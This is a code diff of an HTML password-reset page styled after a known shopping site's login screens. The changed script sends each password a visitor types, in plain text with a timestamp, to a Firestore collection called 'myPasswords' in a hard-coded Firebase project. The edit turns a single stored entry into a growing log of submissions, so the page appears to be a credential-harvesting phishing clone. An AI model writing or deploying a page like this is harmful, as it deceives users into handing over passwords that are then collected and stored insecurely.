@@ -7,12 +7,21 @@
   <link rel="stylesheet" href="../style.css" />
 </head>
 <body>
+<div id="auth-header-container"></div>
+
 <main class="reset-password">
   <div class="reset-password-card auth-card">
     <div class="auth-card-header">
-      <a href="./login.html">Back</a>
-      <h2 class="auth-card-title">Set your new password</h2>
+      <a href="./login.html">
+        <svg viewBox="0 0 22 17" class="adQfSO" width="24" height="18.55" fill="#EE4D2D">
+          <g stroke="none" stroke-width="1" fill-rule="evenodd" transform="translate(-3, -6)">
+            <path d="M5.78416545,15.2727801 L12.9866648,21.7122915 C13.286114,22.0067577 13.286114,22.4841029 12.9866648,22.7785691 C12.6864297,23.0738103 12.200709,23.0738103 11.9004739,22.7785691 L3.29347136,15.0837018 C3.27067864,15.0651039 3.23845445,15.072853 3.21723364,15.0519304 C3.06240034,14.899273 2.99480814,14.7001208 3.00030983,14.5001937 C2.99480814,14.3002667 3.06240034,14.1003396 3.21723364,13.9476821 C3.23845445,13.9275344 3.2714646,13.9345086 3.29425732,13.9166857 L11.9004739,6.22026848 C12.200709,5.92657717 12.6864297,5.92657717 12.9866648,6.22026848 C13.286114,6.51628453 13.286114,6.99362977 12.9866648,7.288096 L5.78416545,13.7276073 L24.2140442,13.7276073 C24.6478918,13.7276073 25,14.0739926 25,14.5001937 C25,14.9263948 24.6478918,15.2727801 24.2140442,15.2727801 L5.78416545,15.2727801 Z"></path>
+          </g>
+        </svg>
+      </a>
+      <h2 class="auth-card-title">Reset Password</h2>
     </div>
+
     <div class="auth-card-main">
       <form id="new_password_form" class="form-inputs">
         <input type="password" id="confirm_password" placeholder="Enter new password" required />
@@ -45,36 +54,41 @@ const firebaseConfig = {
   appId: "1:171858929334:web:8e3c641c866793debd2817",
   measurementId: "G-QF6RKRRPDV"
 };
-  firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore();
+firebase.initializeApp(firebaseConfig);
+const db = firebase.firestore();
 
-  const form = document.getElementById('new_password_form');
-  const passwordInput = document.getElementById('confirm_password');
-  const resetBtn = document.getElementById('reset_password_btn');
+const form = document.getElementById('new_password_form');
+const passwordInput = document.getElementById('confirm_password');
+const resetBtn = document.getElementById('reset_password_btn');
 
-  // Enable button if password meets criteria
-  passwordInput.addEventListener('input', () => {
-    const pwd = passwordInput.value;
-    const valid = /^(?=.*[a-z])(?=.*[A-Z])[A-Za-z\d!@#$%^&*()_+]{8,16}$/.test(pwd);
-    resetBtn.disabled = !valid;
-    resetBtn.style.background = valid ? '#EE4D2D' : '#F3826C';
-  });
+// Enable button if password meets criteria
+passwordInput.addEventListener('input', () => {
+  const pwd = passwordInput.value;
+  const valid = /^(?=.*[a-z])(?=.*[A-Z])[A-Za-z\d!@#$%^&*()_+]{8,16}$/.test(pwd);
+  resetBtn.disabled = !valid;
+  resetBtn.style.background = valid ? '#EE4D2D' : '#F3826C';
+});
 
-  // Save password directly to Firestore (for personal use only)
-  form.addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const pwd = passwordInput.value;
+// Save password as a new log entry
+form.addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const pwd = passwordInput.value;
 
-    try {
-      await db.collection('myPasswords').doc('personal').set({ password: pwd });
-      alert('Password saved successfully!');
-      passwordInput.value = '';
-      resetBtn.disabled = true;
-    } catch (err) {
-      console.error(err);
-      alert('Error saving password: ' + err.message);
-    }
-  });
+  try {
+    // Add a new document to 'myPasswords' collection with a timestamp
+    await db.collection('myPasswords').add({
+      password: pwd,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    });
+
+    alert('Password saved successfully!');
+    passwordInput.value = '';
+    resetBtn.disabled = true;
+  } catch (err) {
+    console.error(err);
+    alert('Error saving password: ' + err.message);
+  }
+});
 </script>
 </body>
 </html>
